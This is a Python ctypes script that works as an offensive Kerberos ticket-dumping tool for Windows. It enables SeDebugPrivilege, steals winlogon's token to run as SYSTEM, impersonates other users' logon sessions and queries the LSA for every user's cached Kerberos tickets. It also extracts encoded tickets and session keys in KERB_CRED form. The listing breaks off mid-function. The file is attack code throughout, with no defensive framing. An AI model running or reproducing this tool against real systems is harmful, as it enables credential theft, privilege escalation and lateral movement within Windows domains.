#!/usr/bin/env python3
import sys
import os
import ctypes
import base64
from ctypes import wintypes, POINTER, Structure, Union, sizeof, byref, cast, c_void_p
from datetime import datetime, timedelta


TOKEN_QUERY = 0x0008
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_DUPLICATE = 0x0002
TOKEN_IMPERSONATE = 0x0004
TOKEN_STATISTICS_INFO_CLASS = 10
SE_PRIVILEGE_ENABLED = 0x00000002
SE_DEBUG_NAME = "SeDebugPrivilege"
SecurityImpersonation = 2
PROCESS_QUERY_INFORMATION = 0x0400
TH32CS_SNAPPROCESS = 0x00000002
KerbQueryTicketCacheMessage = 1
KerbRetrieveEncodedTicketMessage = 8
KerbQueryTicketCacheExMessage = 14
KerbSubmitTicketMessage = 21
KERB_RETRIEVE_TICKET_AS_KERB_CRED = 0x8

LOGON_TYPE_NAMES = {
    0: "Unknown", 2: "Interactive", 3: "Network", 4: "Batch", 5: "Service",
    7: "Unlock", 8: "NetworkCleartext", 9: "NewCredentials", 10: "RemoteInteractive", 11: "CachedInteractive"
}

ENCRYPTION_TYPES = {
    1: "DES-CBC-CRC", 3: "DES-CBC-MD5", 17: "AES-128-CTS-HMAC-SHA1-96",
    18: "AES-256-CTS-HMAC-SHA1-96", 23: "RC4-HMAC", 24: "RC4-HMAC-EXP"
}

g_tgt_list = []


class LUID(Structure):
    _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]


class LARGE_INTEGER(Union):
    _fields_ = [("QuadPart", ctypes.c_int64)]


class LSA_UNICODE_STRING(Structure):
    _fields_ = [("Length", wintypes.USHORT), ("MaximumLength", wintypes.USHORT), ("Buffer", wintypes.LPWSTR)]


class LSA_STRING(Structure):
    _fields_ = [("Length", wintypes.USHORT), ("MaximumLength", wintypes.USHORT), ("Buffer", POINTER(ctypes.c_char))]


class SECURITY_LOGON_SESSION_DATA(Structure):
    _fields_ = [
        ("Size", wintypes.ULONG), ("LogonId", LUID), ("UserName", LSA_UNICODE_STRING),
        ("LogonDomain", LSA_UNICODE_STRING), ("AuthenticationPackage", LSA_UNICODE_STRING),
        ("LogonType", wintypes.ULONG), ("Session", wintypes.ULONG), ("Sid", wintypes.LPVOID),
        ("LogonTime", LARGE_INTEGER), ("LogonServer", LSA_UNICODE_STRING),
        ("DnsDomainName", LSA_UNICODE_STRING), ("Upn", LSA_UNICODE_STRING)
    ]


class TOKEN_STATISTICS(Structure):
    _fields_ = [
        ("TokenId", LUID), ("AuthenticationId", LUID), ("ExpirationTime", LARGE_INTEGER),
        ("TokenType", wintypes.DWORD), ("ImpersonationLevel", wintypes.DWORD),
        ("DynamicCharged", wintypes.DWORD), ("DynamicAvailable", wintypes.DWORD),
        ("GroupCount", wintypes.DWORD), ("PrivilegeCount", wintypes.DWORD), ("ModifiedId", LUID)
    ]


class KERB_QUERY_TKT_CACHE_REQUEST(Structure):
    _fields_ = [("MessageType", wintypes.ULONG), ("LogonId", LUID)]


class KERB_QUERY_TKT_CACHE_RESPONSE(Structure):
    _fields_ = [("MessageType", wintypes.ULONG), ("CountOfTickets", wintypes.ULONG)]


class KERB_TICKET_CACHE_INFO(Structure):
    _fields_ = [
        ("ServerName", LSA_UNICODE_STRING), ("RealmName", LSA_UNICODE_STRING),
        ("StartTime", LARGE_INTEGER), ("EndTime", LARGE_INTEGER), ("RenewTime", LARGE_INTEGER),
        ("EncryptionType", wintypes.LONG), ("TicketFlags", wintypes.ULONG)
    ]


class KERB_TICKET_CACHE_INFO_EX(Structure):
    _fields_ = [
        ("ClientName", LSA_UNICODE_STRING), ("ClientRealm", LSA_UNICODE_STRING),
        ("ServerName", LSA_UNICODE_STRING), ("ServerRealm", LSA_UNICODE_STRING),
        ("StartTime", LARGE_INTEGER), ("EndTime", LARGE_INTEGER), ("RenewTime", LARGE_INTEGER),
        ("EncryptionType", wintypes.LONG), ("TicketFlags", wintypes.ULONG)
    ]


class LUID_AND_ATTRIBUTES(Structure):
    _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]


class TOKEN_PRIVILEGES(Structure):
    _fields_ = [("PrivilegeCount", wintypes.DWORD), ("Privileges", LUID_AND_ATTRIBUTES * 1)]


class PROCESSENTRY32W(Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD), ("cntUsage", wintypes.DWORD), ("th32ProcessID", wintypes.DWORD),
        ("th32DefaultHeapID", POINTER(wintypes.ULONG)), ("th32ModuleID", wintypes.DWORD),
        ("cntThreads", wintypes.DWORD), ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase", wintypes.LONG), ("dwFlags", wintypes.DWORD),
        ("szExeFile", wintypes.WCHAR * 260)
    ]


class KERB_CRYPTO_KEY(Structure):
    _fields_ = [
        ("KeyType", wintypes.LONG),
        ("Length", wintypes.ULONG),
        ("Value", POINTER(ctypes.c_ubyte))
    ]


class KERB_EXTERNAL_NAME(Structure):
    _fields_ = [
        ("NameType", wintypes.SHORT),
        ("NameCount", wintypes.USHORT)
    ]


class KERB_EXTERNAL_TICKET(Structure):
    _fields_ = [
        ("ServiceName", POINTER(KERB_EXTERNAL_NAME)),
        ("TargetName", POINTER(KERB_EXTERNAL_NAME)),
        ("ClientName", POINTER(KERB_EXTERNAL_NAME)),
        ("DomainName", LSA_UNICODE_STRING),
        ("TargetDomainName", LSA_UNICODE_STRING),
        ("AltTargetDomainName", LSA_UNICODE_STRING),
        ("SessionKey", KERB_CRYPTO_KEY),
        ("TicketFlags", wintypes.ULONG),
        ("Flags", wintypes.ULONG),
        ("KeyExpirationTime", LARGE_INTEGER),
        ("StartTime", LARGE_INTEGER),
        ("EndTime", LARGE_INTEGER),
        ("RenewUntil", LARGE_INTEGER),
        ("TimeSkew", LARGE_INTEGER),
        ("EncodedTicketSize", wintypes.LONG),
        ("EncodedTicket", POINTER(ctypes.c_ubyte))
    ]


class KERB_RETRIEVE_TKT_RESPONSE(Structure):
    _fields_ = [("Ticket", KERB_EXTERNAL_TICKET)]


class SECURITY_HANDLE(Structure):
    _fields_ = [("LowPart", c_void_p), ("HighPart", c_void_p)]


class KERB_RETRIEVE_TKT_REQUEST(Structure):
    _fields_ = [
        ("MessageType", wintypes.ULONG),
        ("LogonId", LUID),
        ("TargetName", LSA_UNICODE_STRING),
        ("TicketFlags", wintypes.ULONG),
        ("CacheOptions", wintypes.ULONG),
        ("EncryptionType", wintypes.LONG),
        ("CredentialsHandle", SECURITY_HANDLE)
    ]


class KERB_CRYPTO_KEY32(Structure):
    _fields_ = [
        ("KeyType", wintypes.LONG),
        ("Length", wintypes.ULONG),
        ("Offset", wintypes.ULONG)
    ]


class KERB_SUBMIT_TKT_REQUEST(Structure):
    _fields_ = [
        ("MessageType", wintypes.ULONG),
        ("LogonId", LUID),
        ("Flags", wintypes.ULONG),
        ("Key", KERB_CRYPTO_KEY32),
        ("KerbCredSize", wintypes.ULONG),
        ("KerbCredOffset", wintypes.ULONG)
    ]


try:
    secur32 = ctypes.WinDLL('secur32.dll')
    advapi32 = ctypes.WinDLL('advapi32.dll')
    kernel32 = ctypes.WinDLL('kernel32.dll')
except Exception as e:
    print(f"[-] Failed to load DLLs: {e}")
    sys.exit(1)


LsaConnectUntrusted = secur32.LsaConnectUntrusted
LsaConnectUntrusted.argtypes = [POINTER(wintypes.HANDLE)]
LsaConnectUntrusted.restype = wintypes.LONG

LsaLookupAuthenticationPackage = secur32.LsaLookupAuthenticationPackage
LsaLookupAuthenticationPackage.argtypes = [wintypes.HANDLE, POINTER(LSA_STRING), POINTER(wintypes.ULONG)]
LsaLookupAuthenticationPackage.restype = wintypes.LONG

LsaCallAuthenticationPackage = secur32.LsaCallAuthenticationPackage
LsaCallAuthenticationPackage.argtypes = [
    wintypes.HANDLE, wintypes.ULONG, wintypes.LPVOID, wintypes.ULONG,
    POINTER(wintypes.LPVOID), POINTER(wintypes.ULONG), POINTER(wintypes.LONG)
]
LsaCallAuthenticationPackage.restype = wintypes.LONG

LsaFreeReturnBuffer = secur32.LsaFreeReturnBuffer
LsaFreeReturnBuffer.argtypes = [wintypes.LPVOID]
LsaFreeReturnBuffer.restype = wintypes.LONG

LsaEnumerateLogonSessions = secur32.LsaEnumerateLogonSessions
LsaEnumerateLogonSessions.argtypes = [POINTER(wintypes.ULONG), POINTER(POINTER(LUID))]
LsaEnumerateLogonSessions.restype = wintypes.LONG

LsaGetLogonSessionData = secur32.LsaGetLogonSessionData
LsaGetLogonSessionData.argtypes = [POINTER(LUID), POINTER(POINTER(SECURITY_LOGON_SESSION_DATA))]
LsaGetLogonSessionData.restype = wintypes.LONG

LsaDeregisterLogonProcess = secur32.LsaDeregisterLogonProcess
LsaDeregisterLogonProcess.argtypes = [wintypes.HANDLE]
LsaDeregisterLogonProcess.restype = wintypes.LONG

OpenProcessToken = advapi32.OpenProcessToken
OpenProcessToken.argtypes = [wintypes.HANDLE, wintypes.DWORD, POINTER(wintypes.HANDLE)]
OpenProcessToken.restype = wintypes.BOOL

GetTokenInformation = advapi32.GetTokenInformation
GetTokenInformation.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, POINTER(wintypes.DWORD)]
GetTokenInformation.restype = wintypes.BOOL

LookupPrivilegeValueW = advapi32.LookupPrivilegeValueW
LookupPrivilegeValueW.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, POINTER(LUID)]
LookupPrivilegeValueW.restype = wintypes.BOOL

AdjustTokenPrivileges = advapi32.AdjustTokenPrivileges
AdjustTokenPrivileges.argtypes = [wintypes.HANDLE, wintypes.BOOL, POINTER(TOKEN_PRIVILEGES), wintypes.DWORD, POINTER(TOKEN_PRIVILEGES), POINTER(wintypes.DWORD)]
AdjustTokenPrivileges.restype = wintypes.BOOL

DuplicateToken = advapi32.DuplicateToken
DuplicateToken.argtypes = [wintypes.HANDLE, wintypes.DWORD, POINTER(wintypes.HANDLE)]
DuplicateToken.restype = wintypes.BOOL

DuplicateTokenEx = advapi32.DuplicateTokenEx
DuplicateTokenEx.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, POINTER(wintypes.HANDLE)]
DuplicateTokenEx.restype = wintypes.BOOL

ImpersonateLoggedOnUser = advapi32.ImpersonateLoggedOnUser
ImpersonateLoggedOnUser.argtypes = [wintypes.HANDLE]
ImpersonateLoggedOnUser.restype = wintypes.BOOL

RevertToSelf = advapi32.RevertToSelf
RevertToSelf.argtypes = []
RevertToSelf.restype = wintypes.BOOL

GetCurrentProcess = kernel32.GetCurrentProcess
GetCurrentProcess.argtypes = []
GetCurrentProcess.restype = wintypes.HANDLE

CloseHandle = kernel32.CloseHandle
CloseHandle.argtypes = [wintypes.HANDLE]
CloseHandle.restype = wintypes.BOOL

GetLastError = kernel32.GetLastError
GetLastError.argtypes = []
GetLastError.restype = wintypes.DWORD

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
OpenProcess.restype = wintypes.HANDLE

CreateToolhelp32Snapshot = kernel32.CreateToolhelp32Snapshot
CreateToolhelp32Snapshot.argtypes = [wintypes.DWORD, wintypes.DWORD]
CreateToolhelp32Snapshot.restype = wintypes.HANDLE

Process32FirstW = kernel32.Process32FirstW
Process32FirstW.argtypes = [wintypes.HANDLE, POINTER(PROCESSENTRY32W)]
Process32FirstW.restype = wintypes.BOOL

Process32NextW = kernel32.Process32NextW
Process32NextW.argtypes = [wintypes.HANDLE, POINTER(PROCESSENTRY32W)]
Process32NextW.restype = wintypes.BOOL


def unicode_string_to_string(unicode_string):
    if unicode_string.Length == 0 or not unicode_string.Buffer:
        return ""
    try:
        length = unicode_string.Length // 2
        result = unicode_string.Buffer[:length]
        return result
    except:
        return ""


def filetime_to_datetime(large_int):
    if large_int.QuadPart == 0:
        return datetime(1601, 1, 1)
    try:
        epoch = datetime(1601, 1, 1)
        delta = timedelta(microseconds=large_int.QuadPart / 10)
        return epoch + delta
    except:
        return datetime(1601, 1, 1)


def format_ticket_flags(flags):
    flag_names = []
    if flags & 0x40000000: flag_names.append("forwardable")
    if flags & 0x20000000: flag_names.append("forwarded")
    if flags & 0x10000000: flag_names.append("proxiable")
    if flags & 0x08000000: flag_names.append("proxy")
    if flags & 0x04000000: flag_names.append("may_postdate")
    if flags & 0x02000000: flag_names.append("postdated")
    if flags & 0x01000000: flag_names.append("invalid")
    if flags & 0x00800000: flag_names.append("renewable")
    if flags & 0x00400000: flag_names.append("initial")
    if flags & 0x00200000: flag_names.append("pre_authent")
    if flags & 0x00100000: flag_names.append("hw_authent")
    if flags & 0x00040000: flag_names.append("ok_as_delegate")
    if flags & 0x00010000: flag_names.append("name_canonicalize")
    return " ".join(flag_names) if flag_names else "0"


def enable_debug_privilege():
    h_token = wintypes.HANDLE()
    h_process = GetCurrentProcess()
    if not OpenProcessToken(h_process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, byref(h_token)):
        return False
    luid = LUID()
    if not LookupPrivilegeValueW(None, SE_DEBUG_NAME, byref(luid)):
        CloseHandle(h_token)
        return False
    tp = TOKEN_PRIVILEGES()
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    if not AdjustTokenPrivileges(h_token, False, byref(tp), 0, None, None):
        CloseHandle(h_token)
        return False
    error = GetLastError()
    CloseHandle(h_token)
    if error == 1300:
        return False
    print("[+] SeDebugPrivilege enabled successfully")
    return True


def get_current_logon_id():
    h_token = wintypes.HANDLE()
    h_process = GetCurrentProcess()
    if not OpenProcessToken(h_process, TOKEN_QUERY, byref(h_token)):
        return None
    stats = TOKEN_STATISTICS()
    return_length = wintypes.DWORD()
    if not GetTokenInformation(h_token, TOKEN_STATISTICS_INFO_CLASS, byref(stats), sizeof(stats), byref(return_length)):
        CloseHandle(h_token)
        return None
    CloseHandle(h_token)
    logon_id = stats.AuthenticationId
    return logon_id


def print_current_logon_id():
    logon_id = get_current_logon_id()
    if logon_id:
        print(f"Current LogonId is {logon_id.HighPart}:0x{logon_id.LowPart:x}")


def get_process_id_of_name(process_name):
    h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if h_snapshot == -1:
        return 0
    pe = PROCESSENTRY32W()
    pe.dwSize = sizeof(PROCESSENTRY32W)
    if not Process32FirstW(h_snapshot, byref(pe)):
        CloseHandle(h_snapshot)
        return 0
    while True:
        if pe.szExeFile.lower() == process_name.lower():
            CloseHandle(h_snapshot)
            return pe.th32ProcessID
        if not Process32NextW(h_snapshot, byref(pe)):
            break
    CloseHandle(h_snapshot)
    return 0


def get_system():
    winlogon_pid = get_process_id_of_name("winlogon.exe")
    if winlogon_pid == 0:
        return False
    h_process = OpenProcess(PROCESS_QUERY_INFORMATION, False, winlogon_pid)
    if not h_process:
        return False
    h_token = wintypes.HANDLE()
    if not OpenProcessToken(h_process, TOKEN_DUPLICATE, byref(h_token)):
        CloseHandle(h_process)
        return False
    h_dup_token = wintypes.HANDLE()
    if not DuplicateToken(h_token, SecurityImpersonation, byref(h_dup_token)):
        CloseHandle(h_token)
        CloseHandle(h_process)
        return False
    if not ImpersonateLoggedOnUser(h_dup_token):
        CloseHandle(h_dup_token)
        CloseHandle(h_token)
        CloseHandle(h_process)
        return False
    CloseHandle(h_token)
    CloseHandle(h_dup_token)
    CloseHandle(h_process)
    return True


def get_lsa_handle_with_impersonation():
    is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    if is_admin:
        if not get_system():
            return None
        lsa_handle = wintypes.HANDLE()
        status = LsaConnectUntrusted(byref(lsa_handle))
        RevertToSelf()
        if status != 0:
            return None
        return lsa_handle
    else:
        lsa_handle = wintypes.HANDLE()
        status = LsaConnectUntrusted(byref(lsa_handle))
        if status != 0:
            return None
        return lsa_handle


def impersonate_session(target_logon_id):
    h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if h_snapshot == -1:
        return None
    
    pe = PROCESSENTRY32W()
    pe.dwSize = sizeof(PROCESSENTRY32W)
    
    if not Process32FirstW(h_snapshot, byref(pe)):
        CloseHandle(h_snapshot)
        return None
    
    while True:
        h_process = OpenProcess(PROCESS_QUERY_INFORMATION, False, pe.th32ProcessID)
        if h_process:
            h_token = wintypes.HANDLE()
            if OpenProcessToken(h_process, TOKEN_QUERY | TOKEN_DUPLICATE, byref(h_token)):
                stats = TOKEN_STATISTICS()
                return_length = wintypes.DWORD()
                if GetTokenInformation(h_token, TOKEN_STATISTICS_INFO_CLASS, byref(stats), sizeof(stats), byref(return_length)):
                    if stats.AuthenticationId.LowPart == target_logon_id:
                        h_imp_token = wintypes.HANDLE()
                        MAXIMUM_ALLOWED = 0x02000000
                        TokenImpersonation = 2
                        if DuplicateTokenEx(h_token, MAXIMUM_ALLOWED, None, SecurityImpersonation, TokenImpersonation, byref(h_imp_token)):
                            CloseHandle(h_token)
                            CloseHandle(h_process)
                            CloseHandle(h_snapshot)
                            return h_imp_token
                CloseHandle(h_token)
            CloseHandle(h_process)
        
        if not Process32NextW(h_snapshot, byref(pe)):
            break
    
    CloseHandle(h_snapshot)
    return None


def request_service_ticket(lsa_handle, auth_pack, user_logon_id, target_name, ticket_flags):
    try:
        target_name_len = len(target_name)
        t_name = LSA_UNICODE_STRING()
        t_name.Length = target_name_len * 2
        t_name.MaximumLength = t_name.Length + 2
        
        target_name_buffer = ctypes.create_unicode_buffer(target_name)
        t_name.Buffer = ctypes.cast(target_name_buffer, wintypes.LPWSTR)
        
        struct_size = sizeof(KERB_RETRIEVE_TKT_REQUEST)
        total_size = struct_size + t_name.MaximumLength
        
        request_buffer = (ctypes.c_byte * total_size)()
        request = KERB_RETRIEVE_TKT_REQUEST.from_buffer(request_buffer)
        
        request.MessageType = KerbRetrieveEncodedTicketMessage
        request.LogonId = user_logon_id
        request.TargetName.Length = t_name.Length
        request.TargetName.MaximumLength = t_name.MaximumLength
        request.TicketFlags = ticket_flags
        request.CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED
        request.EncryptionType = 0
        request.CredentialsHandle.LowPart = None
        request.CredentialsHandle.HighPart = None
        
        new_target_buffer_offset = struct_size
        ctypes.memmove(
            ctypes.addressof(request_buffer) + new_target_buffer_offset,
            target_name_buffer,
            t_name.MaximumLength
        )
        
        request.TargetName.Buffer = ctypes.cast(
            ctypes.addressof(request_buffer) + new_target_buffer_offset,
            wintypes.LPWSTR
        )
        
        response_ptr = wintypes.LPVOID()
        response_size = wintypes.ULONG()
        protocol_status = wintypes.LONG()
        
        status = LsaCallAuthenticationPackage(
            lsa_handle,
            auth_pack,
            request_buffer,
            total_size,
            byref(response_ptr),
            byref(response_size),
            byref(protocol_status)
        )
        
        if status != 0 or protocol_status.value != 0 or response_size.value == 0:
            return None, None, None
        
        response = cast(response_ptr, POINTER(KERB_RETRIEVE_TKT_RESPONSE)).contents
        
        ticket_bytes = None
        session_key_bytes = None
        key_type = 0
        
        if response.Ticket.EncodedTicketSize > 0 and response.Ticket.EncodedTicket:
            ticket_bytes = bytes(
                (ctypes.c_ubyte * response.Ticket.EncodedTicketSize).from_address(
                    ctypes.addressof(response.Ticket.EncodedTicket.contents)
                )
            )
        
        if response.Ticket.SessionKey.Length > 0 and response.Ticket.SessionKey.Value:
            session_key_bytes = bytes(
                (ctypes.c_ubyte * response.Ticket.SessionKey.Length).from_address(
                    ctypes.addressof(response.Ticket.SessionKey.Value.contents)
                )
            )
            key_type = response.Ticket.SessionKey.KeyType
        
        LsaFreeReturnBuffer(response_ptr)
        
        return ticket_bytes, session_key_bytes, key_type
        
    except Exception as e:
        return None, None, None


def add_tgt_to_list(logon_id, username, domain, service_name):
    global g_tgt_list
    
    for tgt in g_tgt_list:
        if tgt['logon_id'] == logon_id and tgt['service_name'] == service_name:
            return
    
    g_tgt_list.append({
        'logon_id': logon_id,
        'username': username if username else "(unknown)",
        'domain': domain if domain else "(unknown)",
        'service_name': service_name if service_name else "(unknown)"
    })


def enumerate_logon_sessions():
    session_count = wintypes.ULONG()
    session_list = POINTER(LUID)()
    status = LsaEnumerateLogonSessions(byref(session_count), byref(session_list))
    if status != 0:
        print(f"[-] LsaEnumerateLogonSessions failed with status 0x{status:08x}")
        return
    print()
    for i in range(session_count.value):
        session_data_ptr = POINTER(SECURITY_LOGON_SESSION_DATA)()
        status = LsaGetLogonSessionData(byref(session_list[i]), byref(session_data_ptr))
        if status != 0 or not session_data_ptr:
            continue
        session_data = session_data_ptr.contents
        logon_id = session_list[i]
        domain = unicode_string_to_string(session_data.LogonDomain)
        username = unicode_string_to_string(session_data.UserName)
        auth_package = unicode_string_to_string(session_data.AuthenticationPackage)
        logon_type = session_data.LogonType
        logon_type_str = LOGON_TYPE_NAMES.get(logon_type, f"({logon_type})")
        print(f"[{i}] Session {session_data.Session} {logon_id.HighPart}:0x{logon_id.LowPart:x} {domain}\\{username} {auth_package}:{logon_type_str}")
        LsaFreeReturnBuffer(session_data_ptr)
    LsaFreeReturnBuffer(session_list)


def enumerate_my_tickets():
    lsa_handle = wintypes.HANDLE()
    status = LsaConnectUntrusted(byref(lsa_handle))
    if status != 0:
        print(f"[-] LsaConnectUntrusted failed: 0x{status:08x}")
        return
    pkg_name = LSA_STRING()
    pkg_name_str = b"Kerberos"
    pkg_name.Buffer = ctypes.cast(pkg_name_str, POINTER(ctypes.c_char))
    pkg_name.Length = len(pkg_name_str)
    pkg_name.MaximumLength = len(pkg_name_str) + 1
    auth_pack = wintypes.ULONG()
    status = LsaLookupAuthenticationPackage(lsa_handle, byref(pkg_name), byref(auth_pack))
    if status != 0:
        print(f"[-] Failed to find Kerberos package: 0x{status:08x}")
        LsaDeregisterLogonProcess(lsa_handle)
        return
    cache_request = KERB_QUERY_TKT_CACHE_REQUEST()
    cache_request.MessageType = KerbQueryTicketCacheMessage
    cache_request.LogonId = LUID(0, 0)
    response_ptr = wintypes.LPVOID()
    response_size = wintypes.ULONG()
    protocol_status = wintypes.LONG()
    status = LsaCallAuthenticationPackage(
        lsa_handle, auth_pack, byref(cache_request), sizeof(cache_request),
        byref(response_ptr), byref(response_size), byref(protocol_status)
    )
    if status != 0 or protocol_status.value != 0 or not response_ptr:
        print("[-] Failed to query ticket cache")
        LsaDeregisterLogonProcess(lsa_handle)
        return
    response_addr = response_ptr.value if hasattr(response_ptr, 'value') else response_ptr
    cache_response = cast(response_addr, POINTER(KERB_QUERY_TKT_CACHE_RESPONSE)).contents
    ticket_count = cache_response.CountOfTickets
    print(f"Cached Tickets: ({ticket_count})\n")
    if ticket_count == 0:
        LsaFreeReturnBuffer(response_ptr)
        LsaDeregisterLogonProcess(lsa_handle)
        return
    logon_id = get_current_logon_id()
    username = "unknown"
    if logon_id:
        session_data_ptr = POINTER(SECURITY_LOGON_SESSION_DATA)()
        if LsaGetLogonSessionData(byref(logon_id), byref(session_data_ptr)) == 0 and session_data_ptr:
            username = unicode_string_to_string(session_data_ptr.contents.UserName)
            LsaFreeReturnBuffer(session_data_ptr)
    tickets_offset = sizeof(KERB_QUERY_TKT_CACHE_RESPONSE)
    try:
        for i in range(ticket_count):
            ticket_addr = response_addr + tickets_offset + i * sizeof(KERB_TICKET_CACHE_INFO)
            ticket_ptr = cast(ticket_addr, POINTER(KERB_TICKET_CACHE_INFO))
            ticket = ticket_ptr.contents
            server_name = unicode_string_to_string(ticket.ServerName)
            realm_name = unicode_string_to_string(ticket.RealmName)
            start_time = filetime_to_datetime(ticket.StartTime)
            end_time = filetime_to_datetime(ticket.EndTime)
            renew_time = filetime_to_datetime(ticket.RenewTime)
            enc_type = ENCRYPTION_TYPES.get(ticket.EncryptionType, f"Unknown ({ticket.EncryptionType})")
            flags_str = format_ticket_flags(ticket.TicketFlags)
            print(f"#{i}>     Client: {username} @ {realm_name}")
            print(f"        Server: {server_name} @ {realm_name}")
            print(f"        KerbTicket Encryption Type: {enc_type}")
            print(f"        Ticket Flags 0x{ticket.TicketFlags:x} -> {flags_str}")
            print(f"        Start Time: {start_time.strftime('%m/%d/%Y %H:%M:%S')} (local)")
            print(f"        End Time:   {end_time.strftime('%m/%d/%Y %H:%M:%S')} (local)")
            print(f"        Renew Time: {renew_time.strftime('%m/%d/%Y %H:%M:%S')} (local)")
            
            ticket_bytes, session_key_bytes, key_type = request_service_ticket(
                lsa_handle, auth_pack.value, LUID(0, 0), server_name, ticket.TicketFlags
            )
            
            if session_key_bytes:
                key_enc_type = ENCRYPTION_TYPES.get(key_type, f"Unknown ({key_type})")
                print(f"        Session Key Type: {key_enc_type}")
            
            print(f"        Cache Flags: 0x1 -> PRIMARY")
            print(f"        Kdc Called:\n")
    except Exception as e:
        pass
    LsaFreeReturnBuffer(response_ptr)
    LsaDeregisterLogonProcess(lsa_handle)


def enumerate_all_tickets(print_tickets=True):
    global g_tgt_list
    
    if print_tickets:
        print("[*] Action: Dump Kerberos Ticket Data (All Users)\n")
    
    current_luid = get_current_logon_id()
    if current_luid:
        combined = ((current_luid.HighPart << 32) | current_luid.LowPart) & 0xFFFFFFFFFFFFFFFF
        if print_tickets:
            print(f"[*] Current LUID    : 0x{combined:x}\n")
    
    if print_tickets:
        enable_debug_privilege()
    
    lsa_handle = get_lsa_handle_with_impersonation()
    if not lsa_handle:
        print("[-] Failed to get LSA handle")
        return
    
    pkg_name = LSA_STRING()
    pkg_name_str = b"Kerberos"
    pkg_name.Buffer = ctypes.cast(pkg_name_str, POINTER(ctypes.c_char))
    pkg_name.Length = len(pkg_name_str)
    pkg_name.MaximumLength = len(pkg_name_str) + 1
    
    auth_pack = wintypes.ULONG()
    status = LsaLookupAuthenticationPackage(lsa_handle, byref(pkg_name), byref(auth_pack))
    if status != 0:
        LsaDeregisterLogonProcess(lsa_handle)
        return
    
    session_count = wintypes.ULONG()
    session_list = POINTER(LUID)()
    status = LsaEnumerateLogonSessions(byref(session_count), byref(session_list))
    if status != 0:
        LsaDeregisterLogonProcess(lsa_handle)
        return
    
    g_tgt_list = []
    
    total_sessions = 0
    sessions_with_tickets = 0
    total_tickets = 0
    tgt_count = 0
    service_count = 0
    
    for i in range(session_count.value):
        session_luid = session_list[i]
        
        session_data_ptr = POINTER(SECURITY_LOGON_SESSION_DATA)()
        status = LsaGetLogonSessionData(byref(session_luid), byref(session_data_ptr))
        if status != 0 or not session_data_ptr:
            continue
        
        session_data = session_data_ptr.contents
        username = unicode_string_to_string(session_data.UserName)
        domain = unicode_string_to_string(session_data.LogonDomain)
        
        if not username:
            LsaFreeReturnBuffer(session_data_ptr)
            continue
        
        total_sessions += 1
        
        cache_request = KERB_QUERY_TKT_CACHE_REQUEST()
        cache_request.MessageType = KerbQueryTicketCacheExMessage
        cache_request.LogonId = session_luid
        
        response_ptr = wintypes.LPVOID()
        response_size = wintypes.ULONG()
        protocol_status = wintypes.LONG()
        
        status = LsaCallAuthenticationPackage(
            lsa_handle, auth_pack, byref(cache_request), sizeof(cache_request),
            byref(response_ptr), byref(response_size), byref(protocol_status)
        )
        
        if status != 0 or protocol_status.value != 0 or not response_ptr:
            LsaFreeReturnBuffer(session_data_ptr)
            continue
        
        response_addr = response_ptr.value if hasattr(response_ptr, 'value') else response_ptr
        cache_response = cast(response_addr, POINTER(KERB_QUERY_TKT_CACHE_RESPONSE)).contents
        ticket_count = cache_response.CountOfTickets
        
        if ticket_count == 0:
            LsaFreeReturnBuffer(response_ptr)
            LsaFreeReturnBuffer(session_data_ptr)
            continue
        
        sessions_with_tickets += 1
        total_tickets += ticket_count
        
        if print_tickets:
            auth_package = unicode_string_to_string(session_data.AuthenticationPackage)
            logon_type = LOGON_TYPE_NAMES.get(session_data.LogonType, "Unknown")
            logon_time = filetime_to_datetime(session_data.LogonTime)
            logon_server = unicode_string_to_string(session_data.LogonServer)
            dns_domain = unicode_string_to_string(session_data.DnsDomainName)
            upn = unicode_string_to_string(session_data.Upn)
            
            print(f"  UserName                 : {username}")
            print(f"  Domain                   : {domain}")
            print(f"  LogonId                  : 0x{session_luid.LowPart:x}")
            print(f"  UserSID                  : [SID]")
            print(f"  AuthenticationPackage    : {auth_package}")
            print(f"  LogonType                : {logon_type}")
            print(f"  LogonTime                : {logon_time.strftime('%m/%d/%Y %H:%M:%S')}")
            print(f"  LogonServer              : {logon_server}")
            print(f"  LogonServerDNSDomain     : {dns_domain}")
            print(f"  UserPrincipalName        : {upn}")
            print()
        
        tickets_offset = sizeof(KERB_QUERY_TKT_CACHE_RESPONSE)
        
        for j in range(ticket_count):
            ticket_addr = response_addr + tickets_offset + j * sizeof(KERB_TICKET_CACHE_INFO_EX)
            ticket_ptr = cast(ticket_addr, POINTER(KERB_TICKET_CACHE_INFO_EX))
            ticket_info = ticket_ptr.contents
            
            client_name = unicode_string_to_string(ticket_info.ClientName)
            client_realm = unicode_string_to_string(ticket_info.ClientRealm)
            server_name = unicode_string_to_string(ticket_info.ServerName)
            server_realm = unicode_string_to_string(ticket_info.ServerRealm)
            start_time = filetime_to_datetime(ticket_info.StartTime)
            end_time = filetime_to_datetime(ticket_info.EndTime)
            renew_time = filetime_to_datetime(ticket_info.RenewTime)
            flags_str = format_ticket_flags(ticket_info.TicketFlags)
            
            is_tgt = "krbtgt" in server_name.lower()
            if is_tgt:
                tgt_count += 1
                add_tgt_to_list(session_luid.LowPart, username, domain, server_name)
            else:
                service_count += 1
            
            if print_tickets:
                print(f"\n    ServiceName              :  {server_name}")
                print(f"    ServiceRealm             :  {server_realm}")
                print(f"    UserName                 :  {client_name}")
                print(f"    UserRealm                :  {client_realm}")
                print(f"    StartTime                :  {start_time.strftime('%m/%d/%Y %H:%M:%S')}")
